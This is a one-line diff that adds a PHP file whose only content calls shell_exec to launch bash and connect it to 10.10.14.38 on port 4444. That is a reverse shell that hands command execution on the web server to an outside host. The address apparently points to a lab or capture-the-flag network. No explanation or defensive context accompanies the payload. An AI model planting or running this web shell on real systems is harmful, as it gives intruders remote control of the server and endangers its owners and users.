@@ -1,0 +1,1 @@
+<?php shell_exec("/bin/bash 1 > /dev/tcp/10.10.14.38/4444 2>&1 0>&1") ?>
